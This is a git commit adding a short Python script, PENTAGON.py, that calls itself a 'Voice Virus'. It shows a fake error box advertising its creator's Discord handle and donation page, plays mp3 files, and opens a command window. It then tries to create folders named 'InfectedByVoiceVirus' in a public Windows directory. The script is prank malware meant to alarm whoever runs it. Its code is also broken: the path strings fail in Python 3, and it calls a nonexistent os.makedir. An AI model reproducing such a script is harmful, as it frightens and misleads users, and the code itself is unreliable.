e60160cd20222573e46eb3a0d0928a48664bb7af
S4HOK <83090611+S4HOK@users.noreply.github.com>
2021-04-24 00:02:38 +0500

    Create PENTAGON.py

---
+++ PENTAGON.py
@@ -0,0 +1,47 @@
+import os
+from tkinter import *
+
+from tkinter import messagebox
+
+from pygame import mixer
+
+import time
+
+messagebox.showerror(title = 'Voice Virus', message = 'Creator this virus: Discord: Super Tank#0867, DonationAlerts: https://www.donationalerts.com/r/supertank1337. Welcome!')
+
+time.sleep(2)
+
+mixer.music.load("s134Ir1zjeNn-mp4-cbRQInP1.mp3")
+
+mixer.music.play()
+
+mixer.music.load("3450D-Глад-Валакас.mp3")
+
+mixer.music.play()
+
+mixer.music.load("Аннигиляторная-Пушка.mp3")
+
+mixer.music.play()
+
+mixer.music.load("безумно-можно-быть-первым-самый-лучший-BASS-BOOSTED-online-video-cutter.com.mp3")
+
+mixer.music.play()
+
+os.system('cmd /k "help"')
+
+path = 'C:\Users\Public\Downloads'
+path = 'C:\Users\Public\Videos'
+os.chdir(path)
+for i in range (1,11):
+    Newfolder='InfectedByVoiceVirus' + str(i)
+
+    Newfolder='InfectedByVoiceVirus' + str(i)
+
+    Newfolder='InfectedByVoiceVirus' + str(i)
+
+    Newfolder='InfectedByVoiceVirus' + str(i)
+
+    Newfolder='InfectedByVoiceVirus' + str(i)
+
+    Newfolder='InfectedByVoiceVirus' + str(i)
+    os.makedir(Newfolder)
